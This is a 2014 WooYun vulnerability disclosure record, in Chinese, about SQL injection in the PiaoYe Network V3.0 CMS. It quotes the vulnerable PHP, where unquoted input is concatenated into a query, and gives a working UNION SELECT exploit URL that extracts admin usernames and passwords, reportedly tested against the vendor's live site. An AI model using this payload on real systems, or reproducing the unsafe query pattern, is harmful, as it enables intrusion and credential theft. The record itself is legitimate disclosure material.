{"id": 54271, "wybug_id": "wooyun-2014-064985", "wybug_title": "飘叶网络V3.0正式版 sql注入。 官网测试成功", "wybug_corp": "飘叶网络", "wybug_author": "roker", "wybug_date": "2014-06-17 14:09", "wybug_open_date": "2014-09-15 14:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-17：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-09-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  rt  详细说明：  function.php 看到这个函数\nfunction List_show($dbname, $class = '', $newsnum = '', $shows = '*', $hot = '0'){ // newsclass:新闻类型  newsnum:显示条数    $ie = array(        'news',        'pro',        'down');    if ($dbname != 0 && $dbname != 1 && $dbname != 2) {        return \"error\";    }    $sql = \"SELECT $shows FROM `$ie[$dbname]` \";    if ($class != '') {        $sql .= \"where clss=$class \";    }    if ($hot != '0' && $dbname == 1) {        if ($class == \"\") {            $sql .= \"where hot=1 \";        } else {            $sql .= \"and hot=1 \";        }    }    $sql .= \"order by id desc\";    if ($newsnum != '') {        $sql .= \" LIMIT $newsnum\";    }    $cls = $GLOBALS['db']->prepare($sql);    $cls->execute();    $newlist = $cls->fetchAll();    return $newlist;}\ndown.php 调用了\n$id = htmlentities($_GET[\"uid\"], ENT_QUOTES, 'UTF-8');......$down=List_show(2,$id);$down=List_show(2,$id);//下载内容显示$re_num=count($down);//每页显示的条数$page_size = 5;//总条目数$nums = $re_num;//每次显示的页数$sub_pages = 6;//得到当前是第几页$pageCurrent = addslashes($_GET[\"p\"]);\n只是 htmlentities。 没有单引号 。所以直接注入。exp down.php?uid=1 union select 1,username,3,4,5,6,7,8,pass,10 from admin%23\n\n官网测试成功\n\n   漏洞证明：  \n\n   修复方案：  过滤   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-06-19 09:21 |    \t\t阿布 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        )\t\t \n  挖到注入了0。0    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}